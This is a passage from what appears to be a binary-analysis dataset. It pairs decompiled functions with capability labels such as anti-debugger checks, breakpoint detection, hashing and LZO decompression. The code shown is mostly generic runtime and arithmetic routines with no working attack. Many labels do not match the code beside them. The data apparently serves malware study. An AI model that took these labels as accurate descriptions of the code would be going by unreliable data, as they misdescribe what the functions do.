4;\n                    }\n                }\n                fcn.0043ad20(auStack32);\n                uVar2 = fcn.0043ac90();\n                uVar4 = 0xffffffff;\n                if (uVar2 < 4) {\n                    uVar4 = (1 << (uVar2 * '\\b' & 0x1fU)) - 1;\n                }\n                if (((auStack32[0] & uVar4) != 0) &&\n                   (iStack48 = iStack48 + 1,  auStack32[0] <= *in_EAX && *in_EAX != auStack32[0])) {\n                    *in_EAX = auStack32[0];\n                }\n            }\n            param_2 = param_2 + *param_2 + 4;\n            iVar3 = iVar5;\n        } while (*param_2 != 0);\n    }\n    return iStack48;\n}\n",
        "token_count": 540
    },
    "0043b110": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043b110(int32_t *param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t iStack56;\n    uint32_t auStack32 [4];\n    \n    uVar5 = *(in_EAX + 0x10) >> 3;\n    fcn.0043ace0();\n    if (*param_1 != 0) {\n        iStack56 = 0;\n        do {\n            while (param_1[1] != 0) {\n                if (((*(in_EAX + 0x10) & 4) != 0) && (iVar4 = param_1 + (4 - param_1[1]),  iVar4 != iStack56)) {\n                    uVar5 = fcn.0043aed0();\n                    fcn.0043ace0();\n                    iStack56 = iVar4;\n                }\n                if (uVar5 == 0) {\n                    if (param_1[2] != 0) goto code_r0x0043b157;\n                    break;\n                }\n                fcn.0043ad20(auStack32);\n                uVar2 = fcn.0043ac90();\n                uVar3 = 0xffffffff;\n                if (uVar2 < 4) {\n                    uVar3 = (1 << (uVar2 * '\\b' & 0x1fU)) - 1;\n                }\n                if ((auStack32[0] & uVar3) != 0) {\ncode_r0x0043b157:\n                    iVar4 = *param_2;\n                    if (iVar4 != 0) {\n                        iVar1 = *(iVar4 + 4);\n                        *(iVar4 + 4) = iVar1 + 1;\n                        *(iVar4 + 8 + iVar1 * 4) = param_1;\n                    }\n                    break;\n                }\n                param_1 = param_1 + *param_1 + 4;\n                if (*param_1 == 0) {\n                    return;\n                }\n            }\n            param_1 = param_1 + *param_1 + 4;\n        } while (*param_1 != 0);\n    }\n    return;\n}\n",
        "token_count": 520
    },
    "0043b220": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.0043b220(int32_t param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iStack56;\n    uint32_t uStack36;\n    uint32_t auStack32 [4];\n    \n    uVar3 = *(in_EAX + 0x10) >> 3;\n    fcn.0043ace0();\n    iVar4 = *param_2;\n    iStack56 = 0;\n    do {\n        if (iVar4 == 0) {\n            return NULL;\n        }\n        if (param_2[1] != 0) {\n            if (((*(in_EAX + 0x10) & 4) != 0) && (iVar4 = param_2 + (4 - param_2[1]),  iVar4 != iStack56)) {\n                uVar3 = fcn.0043aed0();\n                fcn.0043ace0();\n                iStack56 = iVar4;\n            }\n            if (uVar3 == 0) {\n                uStack36 = param_2[2];\n                auStack32[0] = param_2[3];\n                if ((uStack36 != 0) && (param_1 - uStack36 < auStack32[0])) {\n                    return param_2;\n                }\n            }\n            else {\n                fcn.0043ad20(&uStack36);\n                fcn.0043ad20(auStack32);\n                uVar1 = fcn.0043ac90();\n                uVar2 = 0xffffffff;\n                if (uVar1 < 4) {\n                    uVar2 = (1 << (uVar1 * '\\b' & 0x1fU)) - 1;\n                }\n                if (((uStack36 & uVar2) != 0) && (param_1 - uStack36 < auStack32[0])) {\n                    return param_2;\n                }\n            }\n        }\n        param_2 = param_2 + *param_2 + 4;\n        iVar4 = *param_2;\n    } while( true );\n}\n",
        "token_count": 496
    },
    "004417e0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004417e0(int32_t param_1, int32_t param_2)\n\n{\n    uint32_t uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint8_t *puVar3;\n    uint8_t auStack32 [16];\n    \n    *(param_1 + 0xc) = 0xffffffff;\n    uVar1 = *(param_1 + 4);\n    if (in_EAX == 0) {\n        if ((uVar1 & 0x100) == 0) {\n            if ((uVar1 & 0x40) == 0) {\n                puVar3 = auStack32;\n            }\n            else {\n                auStack32[0] = 0x20;\n                puVar3 = auStack32 + 1;\n            }\n        }\n        else {\n            auStack32[0] = 0x2b;\n            puVar3 = auStack32 + 1;\n        }\n    }\n    else {\n        puVar3 = auStack32 + 1;\n        auStack32[0] = 0x2d;\n    }\n    iVar2 = 0;\n    do {\n        puVar3[iVar2] = *(param_2 + iVar2) & 0xdf | uVar1 & 0x20;\n        iVar2 = iVar2 + 1;\n    } while (iVar2 != 3);\n    fcn.004416c0();\n    return;\n}\n",
        "token_count": 322
    },
    "004404f0": {
        "rules": [
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.004404f0(int32_t param_1, int32_t param_2)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    \n    iVar2 = 7;\n    uVar1 = 0;\n    do {\n        uVar1 = uVar1 + *(param_1 + 2 + iVar2 * 2) + *(param_2 + 2 + iVar2 * 2);\n        *(param_2 + 2 + iVar2 * 2) = uVar1;\n        uVar1 = uVar1 >> 0x10 & 1;\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    return;\n}\n",
        "token_count": 157
    },
    "00440570": {
        "rules": [
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nbool fcn.00440570(int32_t param_1, ushort *param_2)\n\n{\n    uint16_t uVar1;\n    int16_t iVar2;\n    uint16_t uVar3;\n    int32_t iVar4;\n    uint16_t *puVar5;\n    uint32_t uVar7;\n    uint16_t *puVar8;\n    uint16_t *puVar9;\n    bool bVar10;\n    uint *puStack92;\n    int16_t iStack86;\n    ushort auStack54 [2];\n    uint uStack50;\n    uint uStack46;\n    uint uStack42;\n    ushort uStack38;\n    uint uStack36;\n    uint16_t auStack32 [8];\n    uint16_t *puVar6;\n    \n    uVar7 = 0;\n    uStack38 = 0;\n    uStack50 = 0;\n    uStack46 = 0;\n    uStack42 = 0;\n    auStack54[0] = *param_2;\n    auStack54[1] = param_2[1];\n    puVar8 = param_2 + 2;\n    puVar5 = puVar8;\n    do {\n        if ((*puVar5 & 1) != 0) {\n            uVar7 = uVar7 | 1;\n        }\n        uVar3 = *puVar5 >> 1;\n        if ((uVar7 & 2) != 0) {\n            uVar3 = uVar3 | 0x8000;\n        }\n        puVar9 = puVar5 + 1;\n        uVar7 = uVar7 * 2;\n        *puVar5 = uVar3;\n        puVar5 = puVar9;\n    } while (puVar9 != param_2 + 9);\n    uVar3 = *(param_1 + 6);\n    puStack92 = &uStack50;\n    do {\n        if (uVar3 * 0xffff < CONCAT22(param_2[2], param_2[3])) {\n            iStack86 = -1;\n        }\n        else {\n            iStack86 = CONCAT22(param_2[2], param_2[3]) / uVar3;\n        }\n        fcn.004401d0();\n        iVar4 = 2;\n        while( true ) {\n            uVar1 = param_2[iVar4];\n            puVar5 = &uStack36 + iVar4 * 2;\n            bVar10 = *puVar5 == uVar1;\n            iVar2 = iStack86;\n            if (!bVar10) break;\n            iVar4 = iVar4 + 1;\n            if (iVar4 == 9) goto code_r0x0044065f;\n        }\n        if (*puVar5 < uVar1 || bVar10) goto code_r0x0044065f;\n        iVar4 = 7;\n        uVar7 = 0;\n        do {\n            uVar7 = (*(&uStack36 + iVar4 * 2 + 2) - *(param_1 + 2 + iVar4 * 2)) - uVar7;\n            *(&uStack36 + iVar4 * 2 + 2) = uVar7;\n            uVar7 = uVar7 >> 0x10 & 1;\n            iVar4 = iVar4 + -1;\n        } while (iVar4 != 0);\n        iVar4 = 2;\n        do {\n            uVar1 = param_2[iVar4];\n            puVar5 = &uStack36 + iVar4 * 2;\n            bVar10 = *puVar5 != uVar1;\n            iVar2 = iStack86 + -1;\n            if (bVar10) {\n                if (uVar1 <= *puVar5 && bVar10) {\n                    iVar4 = 7;\n                    uVar7 = 0;\n                    do {\n                        uVar7 = (*(&uStack36 + iVar4 * 2 + 2) - *(param_1 + 2 + iVar4 * 2)) - uVar7;\n                        *(&uStack36 + iVar4 * 2 + 2) = uVar7;\n                        uVar7 = uVar7 >> 0x10 & 1;\n                        iVar4 = iVar4 + -1;\n                        iVar2 = iStack86 + -2;\n                    } while (iVar4 != 0);\n                }\n                break;\n            }\n            iVar4 = iVar4 + 1;\n        } while (iVar4 != 9);\ncode_r0x0044065f:\n        iStack86 = iVar2;\n        iVar4 = 7;\n        uVar7 = 0;\n        do {\n            uVar7 = (param_2[iVar4 + 1] - *(&uStack36 + iVar4 * 2 + 2)) - uVar7;\n            param_2[iVar4 + 1] = uVar7;\n            uVar7 = uVar7 >> 0x10 & 1;\n            iVar4 = iVar4 + -1;\n        } while (iVar4 != 0);\n        *puStack92 = iStack86;\n        puVar5 = puVar8;\n        do {\n            puVar6 = puVar5 + 1;\n            *puVar5 = *puVar6;\n            puVar5 = puVar6;\n        } while (puVar6 != param_2 + 8);\n        puStack92 = puStack92 + 2;\n        param_2[8] = 0;\n        if (&uStack36 == puStack92) {\n            uVar3 = 0;\n            do {\n                puVar5 = puVar8 + 1;\n                uVar3 = uVar3 | *puVar8;\n                puVar8 = puVar5;\n            } while (puVar5 != puVar9);\n            iVar4 = 0;\n            do {\n                param_2[iVar4] = auStack54[iVar4];\n                iVar4 = iVar4 + 1;\n            } while (iVar4 != 9);\n            return uVar3 != 0;\n        }\n    } while( true );\n}\n",
        "token_count": 1320
    },
    "004407d0": {
        "rules": [
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint16_t fcn.004407d0(int32_t param_1, uint16_t *param_2)\n\n{\n    int16_t iVar1;\n    uint32_t uVar2;\n    int16_t *piVar3;\n    int32_t iVar4;\n    uint16_t uVar5;\n    uint16_t auStack50 [8];\n    uint16_t auStack34 [2];\n    uint uStack30;\n    uint uStack26;\n    uint uStack22;\n    uint16_t uStack18;\n    \n    uVar5 = 0;\n    uStack30 = 0;\n    uStack26 = 0;\n    uStack22 = 0;\n    piVar3 = param_1 + 0x10;\n    auStack34[0] = *param_2;\n    auStack34[1] = param_2[1];\n    uStack18 = 0;\n    do {\n        iVar1 = *piVar3;\n        piVar3 = piVar3 + -1;\n        if (iVar1 != 0) {\n            iVar4 = 7;\n            fcn.004401d0();\n            uVar2 = 0;\n            do {\n                uVar2 = uVar2 + auStack50[iVar4] + auStack34[iVar4 + 1];\n                auStack34[iVar4 + 1] = uVar2;\n                uVar2 = uVar2 >> 0x10 & 1;\n                iVar4 = iVar4 + -1;\n            } while (iVar4 != 0);\n        }\n        uVar5 = uVar5 | uStack18;\n        uStack18 = uStack22._2_2_;\n        uStack22 = CONCAT22(uStack22, uStack26._2_2_);\n        uStack26 = CONCAT22(uStack26, uStack30._2_2_);\n        uStack30 = uStack30 << 0x10;\n    } while (param_1 + 4 != piVar3);\n    iVar4 = 0;\n    do {\n        param_2[iVar4] = auStack34[iVar4];\n        iVar4 = iVar4 + 1;\n    } while (iVar4 != 9);\n    return uVar5;\n}\n",
        "token_count": 488
    },
    "00443710": {
        "rules": [
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t fcn.00443710(int32_t param_1, int32_t param_2)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint32_t *puVar6;\n    uint32_t *puVar7;\n    uint32_t *puVar8;\n    uint32_t uVar9;\n    uint32_t *puVar10;\n    int32_t iVar12;\n    uint32_t uStack84;\n    uint32_t uStack68;\n    uint32_t *puStack60;\n    int32_t iStack48;\n    uint32_t *puVar11;\n    \n    iVar5 = *(param_2 + 0x10);\n    uVar2 = 0;\n    if (iVar5 <= *(param_1 + 0x10)) {\n        puStack60 = param_2 + 0x14;\n        iStack48 = iVar5 + -1;\n        puVar7 = param_1 + 0x14;\n        puVar1 = puStack60 + iStack48;\n        puVar6 = puVar7 + iStack48;\n        uVar2 = *puVar6 / (*puVar1 + 1);\n        if (uVar2 != 0) {\n            uStack68 = 0;\n            uStack84 = 0;\n            puVar8 = puVar7;\n            puVar10 = puStack60;\n            do {\n                puVar11 = puVar10 + 1;\n                uVar9 = *puVar8;\n                uVar3 = uVar2 * *puVar10;\n                uVar4 = uVar3 + uStack68;\n                uStack68 = (uVar2 * *puVar10 >> 0x20) + CARRY4(uVar3, uStack68);\n                uVar3 = uVar9 - uVar4;\n                *puVar8 = uVar3 - uStack84;\n                uStack84 = -(uVar3 < uStack84) - (uVar9 < uVar4) & 1;\n                puVar8 = puVar8 + 1;\n                puVar10 = puVar11;\n            } while (puVar11 <= puVar1);\n            if (*puVar6 == 0) {\n                if ((puVar7 < puVar6 + -1) && (puVar6[-1] == 0)) {\n                    do {\n                        iStack48 = iStack48 + -1;\n                        if (iStack48 == (iVar5 + -2) - (puVar6 + (-5 - puVar7) >> 2)) break;\n                    } while (puVar6[iStack48 - iVar5] == 0);\n                }\n                *(param_1 + 0x10) = iStack48;\n            }\n        }\n        iVar5 = fcn.004465a0(param_1, param_2);\n        if (-1 < iVar5) {\n            uVar9 = 0;\n            uVar2 = uVar2 + 1;\n            puVar6 = puVar7;\n            do {\n                puVar8 = puStack60 + 1;\n                uVar3 = *puVar6 - *puStack60;\n                uVar4 = uVar3 - uVar9;\n                uVar9 = -(uVar3 < uVar9) - (*puVar6 < *puStack60) & 1;\n                *puVar6 = uVar4;\n                puVar6 = puVar6 + 1;\n                puStack60 = puVar8;\n            } while (puVar8 <= puVar1);\n            puVar1 = puVar7 + iStack48;\n            if (*puVar1 == 0) {\n                iVar5 = iStack48;\n                if ((puVar7 < puVar1 + -1) && (puVar1[-1] == 0)) {\n                    iVar5 = iStack48 + -1;\n                    iVar12 = iVar5 - (puVar1 + (-5 - puVar7) >> 2);\n                    while ((iVar5 != iVar12 && (puVar1[(iVar5 + -1) - iStack48] == 0))) {\n                        iVar5 = iVar5 + -1;\n                    }\n                }\n                iStack48 = iVar5;\n                *(param_1 + 0x10) = iStack48;\n            }\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 970
    },
    "00441440": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00441476)\n// WARNING: Removing unreachable block (ram,0x00441510)\n// WARNING: Removing unreachable block (ram,0x0044147f)\n\nvoid fcn.00441440(uint param_1, uint param_2, uint32_t param_3, uint param_4, uint param_5, uint param_6, \n                 uint32_t *param_7)\n\n{\n    float10 fVar1;\n    int32_t iVar2;\n    uint uStack44;\n    uint uStack40;\n    ushort uStack36;\n    ushort uStack34;\n    uint uStack32;\n    uint auStack20 [4];\n    \n    uStack44 = param_1;\n    uStack40 = param_2;\n    uStack36 = param_3;\n    uStack34 = param_3 >> 0x10;\n    fVar1 = CONCAT28(uStack36, CONCAT44(param_2, param_1));\n    uStack32 = param_4;\n    if (fVar1 == 0) {\n        auStack20[0] = 0;\n        iVar2 = 0;\n    }\n    else if (fVar1 == 0) {\n        auStack20[0] = 2;\n        iVar2 = -0x403d;\n    }\n    else {\n        auStack20[0] = 1;\n        iVar2 = (param_3 & 0x7fff) - 0x403e;\n    }\n    *param_7 = param_3 & 0x8000;\n    fcn.00443920(0x515a84, iVar2, &uStack44, auStack20);\n    return;\n}\n",
        "token_count": 371
    },
    "004c2f50": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t fcn.004c2f50(void)\n\n{\n    int32_t *piVar1;\n    int32_t **ppiVar2;\n    int32_t iVar3;\n    \n    ppiVar2 = fcn.004c30c0();\n    piVar1 = *ppiVar2;\n    if (piVar1 != NULL) {\n        iVar3 = *piVar1;\n        if ((*(piVar1 + 0xc) & 1) != 0) {\n            iVar3 = *(iVar3 + -0x50);\n        }\n        return iVar3;\n    }\n    return 0;\n}\n",
        "token_count": 134
    },
    "004458b0": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nvoid fcn.004458b0(int32_t param_1, uint32_t param_2)\n\n{\n    uint32_t *puVar1;\n    uint32_t *puVar2;\n    uint32_t *puVar3;\n    int8_t iVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint32_t *puVar7;\n    uint32_t *puVar8;\n    uint32_t *puVar9;\n    uint var_10h;\n    uint var_14h;\n    uint8_t uStack28;\n    \n    puVar1 = param_1 + 0x14;\n    if (param_2 >> 5 < *(param_1 + 0x10)) {\n        puVar2 = puVar1 + (param_2 >> 5);\n        puVar3 = puVar1 + *(param_1 + 0x10);\n        if ((param_2 & 0x1f) == 0) {\n            puVar7 = puVar2;\n            puVar8 = puVar1;\n            if (puVar3 <= puVar2) goto code_r0x00445960;\n            do {\n                puVar9 = puVar7 + 1;\n                *puVar8 = *puVar7;\n                puVar7 = puVar9;\n                puVar8 = puVar8 + 1;\n            } while (puVar9 < puVar3);\n            iVar6 = (~puVar2 + puVar3 & 0xfffffffc) + 4;\n            puVar7 = puVar1 + iVar6;\n        }\n        else {\n            iVar4 = param_2 & 0x1f;\n            uStack28 = 0x20 - iVar4;\n            puVar8 = puVar2 + 1;\n            uVar5 = *puVar2 >> iVar4;\n            puVar7 = puVar1;\n            if (puVar8 < puVar3) {\n                do {\n                    puVar9 = puVar8 + 1;\n                    *puVar7 = uVar5 | *puVar8 << (uStack28 & 0x1f);\n                    uVar5 = *puVar8 >> iVar4;\n                    puVar8 = puVar9;\n                    puVar7 = puVar7 + 1;\n                } while (puVar9 < puVar3);\n                puVar7 = param_1 + 0x18 + (puVar3 + (-5 - puVar2) & 0xfffffffcU);\n            }\n            *puVar7 = uVar5;\n            if (uVar5 != 0) {\n                puVar7 = puVar7 + 1;\n            }\n            iVar6 = puVar7 - puVar1;\n        }\n        *(param_1 + 0x10) = iVar6 >> 2;\n        if (puVar7 != puVar1) {\n            return;\n        }\n    }\n    else {\ncode_r0x00445960:\n        *(param_1 + 0x10) = 0;\n    }\n    *(param_1 + 0x14) = 0;\n    return;\n}\n",
        "token_count": 676
    },
    "00446bf0": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nvoid fcn.00446bf0(uint *param_1, int32_t param_2, int32_t param_3)\n\n{\n    uint *puVar1;\n    uint *puVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uint *puVar5;\n    \n    puVar4 = param_3 + 0x14;\n    puVar2 = param_1 + (param_2 + -1 >> 5) + 1;\n    puVar1 = puVar4 + *(param_3 + 0x10);\n    puVar5 = param_1;\n    if (puVar4 < puVar1) {\n        do {\n            puVar3 = puVar4 + 1;\n            *puVar5 = *puVar4;\n            puVar4 = puVar3;\n            puVar5 = puVar5 + 1;\n        } while (puVar3 < puVar1);\n        param_1 = param_1 + (puVar1 + (-0x15 - param_3) & 0xfffffffcU) + 4;\n    }\n    for (; param_1 < puVar2; param_1 = param_1 + 1) {\n        *param_1 = 0;\n    }\n    return;\n}\n",
        "token_count": 277
    },
    "004512b0": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004512b0(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint *puVar4;\n    uint *puVar5;\n    uint auStack284 [63];\n    uint uStack32;\n    uchar auStack28 [12];\n    \n    iVar1 = 0;\n    do {\n        *(auStack284 + iVar1) = iVar1;\n        iVar1 = iVar1 + 1;\n    } while (iVar1 != 0x100);\n    iVar1 = param_1 + 0x1d;\n    if (*(*param_1 + 0x1c) == 0x451530) {\n        puVar5 = param_1 + 0x21U & 0xfffffffc;\n        *(param_1 + 0x1d) = auStack284[0];\n        *(param_1 + 0x119) = uStack32;\n        iVar2 = iVar1 - puVar5;\n        puVar4 = auStack284 - iVar2;\n        for (uVar3 = iVar2 + 0x100U >> 2; uVar3 != 0; uVar3 = uVar3 - 1) {\n            *puVar5 = *puVar4;\n            puVar4 = puVar4 + 1;\n            puVar5 = puVar5 + 1;\n        }\n    }\n    else {\n        (**(*param_1 + 0x1c))(auStack284, auStack28, iVar1);\n    }\n    *(param_1 + 7) = 1;\n    iVar1 = sub.msvcrt.dll_memcmp(auStack284, iVar1, 0x100);\n    if (iVar1 != 0) {\n        *(param_1 + 7) = 2;\n    }\n    return;\n}\n",
        "token_count": 410
    },
    "004abfb0": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004abfb0(uint *param_1, int32_t param_2, uint8_t param_3, int32_t param_4)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    \n    *param_1 = 0x52c990;\n    param_1[4] = 0;\n    param_1[5] = 0;\n    param_1[1] = param_4 != 0;\n    *(param_1 + 3) = param_2 != 0 & param_3;\n    if (param_2 == 0) {\n        param_2 = 0x52cda0;\n    }\n    puVar2 = param_1 + 0x21U & 0xfffffffc;\n    *(param_1 + 0x1d) = 0;\n    *(param_1 + 0x119) = 0;\n    param_1[6] = param_2;\n    uVar1 = param_1 + (0x11d - puVar2) >> 2;\n    for (; uVar1 != 0; uVar1 = uVar1 - 1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *(param_1 + 7) = 0;\n    *(param_1 + 0x11d) = 0;\n    puVar2 = param_1 + 0x121U & 0xfffffffc;\n    *(param_1 + 0x219) = 0;\n    uVar1 = param_1 + (0x21d - puVar2) >> 2;\n    for (; uVar1 != 0; uVar1 = uVar1 - 1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *(param_1 + 0x21d) = 0;\n    return;\n}\n",
        "token_count": 436
    },
    "004c2d80": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint * fcn.004c2d80(int32_t param_1)\n\n{\n    uint32_t *puVar1;\n    uint32_t *puVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    char cVar5;\n    uint *puVar6;\n    uint32_t **ppuVar7;\n    uint uVar8;\n    uint uVar9;\n    int32_t *piVar10;\n    uint32_t uVar11;\n    int32_t iVar12;\n    code *pcVar13;\n    uint *puVar14;\n    ulong uVar15;\n    int32_t iStack152;\n    uint32_t *puStack124;\n    uint32_t *puVar16;\n    \n    puVar6 = sub.msvcrt.dll_malloc(param_1 + 0x60);\n    if ((puVar6 != NULL) || (puVar6 = fcn.004483d0(),  puVar6 != NULL)) {\n        *puVar6 = 0;\n        puVar6[0x17] = 0;\n        puVar14 = puVar6 + 1 & 0xfffffffc;\n        for (uVar11 = puVar6 + (0x60 - (puVar6 + 1 & 0xfffffffc)) >> 2; uVar11 != 0; uVar11 = uVar11 - 1) {\n            *puVar14 = 0;\n            puVar14 = puVar14 + 1;\n        }\n        return puVar6 + 0x18;\n    }\n    fcn.004bf910();\n    puVar6 = fcn.004c2d80(4);\n    *puVar6 = 0x52cbc0;\n    fcn.004c3330(puVar6, 0x528d50, 0x4b95d0);\n    puVar6 = fcn.004c2d80(4);\n    *puVar6 = 0x52beb4;\n    puVar16 = 0x528810;\n    fcn.004c3330(puVar6, 0x528810, 0x48d780);\n    ppuVar7 = fcn.004c30c0();\n    puVar2 = *ppuVar7;\n    puVar1 = puVar16 + -0xc;\n    iVar12 = puVar16[1] + 0xb8b1aabc + (0x432b2aff < *puVar16);\n    if (iVar12 == 0 && (1 < *puVar16 + 0xbcd4d500) <= -iVar12) {\n        uVar11 = puVar16[-7];\n        uVar4 = -uVar11;\n        if (-1 < uVar11) {\n            uVar4 = uVar11;\n        }\n        puVar16[-7] = uVar4 + 1;\n        ppuVar7[1] = ppuVar7[1] + -1;\n        if (puVar2 != puVar1) {\n            puVar16[-8] = puVar2;\n            *ppuVar7 = puVar1;\n        }\n        return puVar16[-2];\n    }\n    if (puVar2 == NULL) {\n        *ppuVar7 = puVar1;\n        return NULL;\n    }\n    fcn.004bf910();\n    if ((puStack124 == NULL) ||\n       (fcn.004c2e40(puStack124),  iVar12 = puStack124[1] + 0xb8b1aabc + (0x432b2aff < *puStack124), \n       iVar12 != 0 || -iVar12 < (1 < *puStack124 + 0xbcd4d500))) {\n        fcn.004bf910();\n    }\n    fcn.00447fc0(puStack124[-9]);\n    fcn.004c2e40(iStack152);\n    uVar9 = *(iStack152 + -0x18);\n    uVar3 = *(iStack152 + -0x24);\n    uVar8 = fcn.00447fe0(*(iStack152 + -0x28));\n    fcn.004c2e40(uVar8);\n    fcn.004c30e0();\n    while( true ) {\n        fcn.00447c80();\n        cVar5 = fcn.00447d60(uVar9);\n        if (cVar5 != '\\0') break;\n        cVar5 = fcn.00447d60(uVar9);\n        if (cVar5 != '\\0') goto code_r0x004c3c5e;\n        fcn.00447fc0(uVar3);\n    }\n    fcn.004c32d0();\ncode_r0x004c3c5e:\n    puVar6 = fcn.004c2d80(4);\n    *puVar6 = 0x52c0b4;\n    fcn.004c3330(puVar6, 0x528938, 0x496100);\n    uVar9 = sub.msvcrt.dll_abort();\n    fcn.004c2e40(uVar9);\n    uVar15 = sub.msvcrt.dll_abort();\n    fcn.004c2fb0();\n    pcVar13 = (uVar15 >> 0x20) + 1;\n    if (pcVar13 != NULL) {\n        fcn.0043a8e0(uVar15);\n    }\n    uVar15 = fcn.004c2f10();\n    uVar9 = uVar15;\n    if (uVar15 >> 0x20 != 1) goto code_r0x004c3d3d;\n    piVar10 = fcn.004c2e40(uVar9);\n    uVar9 = (**(*piVar10 + 8))();\n    uVar8 = (*pcVar13)(2);\n    sub.msvcrt.dll_fwrite(\"  what():  \", 1, 0xb, uVar8);\n    uVar8 = (*pcVar13)(2);\n    sub.msvcrt.dll_fputs(uVar9, uVar8);\n    uVar9 = (*pcVar13)(2);\n    sub.msvcrt.dll_fputc(10, uVar9);\n    fcn.004c2fb0();\n    do {\n        sub.msvcrt.dll_abort();\n        uVar9 = uVar3;\n        fcn.00446e88(uVar3);\n        fcn.004c32d0();\ncode_r0x004c3d3d:\n        fcn.004c2e40(uVar9);\n        fcn.004c2fb0();\n    } while( true );\n}\n",
        "token_count": 1459
    },
    "004468d0": {
        "rules": [
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b"
        ],
        "decompiled_code": "\nvoid fcn.004468d0(ulong param_1, int32_t *param_2, int32_t *param_3)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    uint8_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint32_t uStack36;\n    uint32_t uStack32;\n    \n    iVar4 = fcn.00445f30(1);\n    if (iVar4 != 0) {\n        uStack32 = param_1 >> 0x20;\n        uVar8 = uStack32 >> 0x14 & 0x7ff;\n        uVar5 = uStack32 & 0xfffff;\n        if (uVar8 != 0) {\n            uVar5 = uStack32 & 0xfffff | 0x100000;\n        }\n        uStack36 = param_1;\n        if (uStack36 == 0) {\n            *(iVar4 + 0x10) = 1;\n            iVar6 = 0;\n            for (uVar7 = uVar5; (uVar7 & 1) == 0; uVar7 = uVar7 >> 1 | 0x80000000) {\n                iVar6 = iVar6 + 1;\n            }\n            iVar2 = iVar6 + 0x20;\n            *(iVar4 + 0x14) = uVar5 >> (iVar6 & 0x1f);\n            iVar6 = 1;\n        }\n        else {\n            iVar2 = 0;\n            for (uVar7 = uStack36; (uVar7 & 1) == 0; uVar7 = uVar7 >> 1 | 0x80000000) {\n                iVar2 = iVar2 + 1;\n            }\n            if (iVar2 == 0) {\n                *(iVar4 + 0x14) = uStack36;\n            }\n            else {\n                uVar3 = iVar2;\n                uVar7 = uVar5 << (0x20 - uVar3 & 0x1f);\n                uVar5 = uVar5 >> (uVar3 & 0x1f);\n                *(iVar4 + 0x14) = uVar7 | uStack36 >> (uVar3 & 0x1f);\n            }\n            *(iVar4 + 0x18) = uVar5;\n            iVar6 = (uVar5 != 0) + 1;\n            *(iVar4 + 0x10) = iVar6;\n        }\n   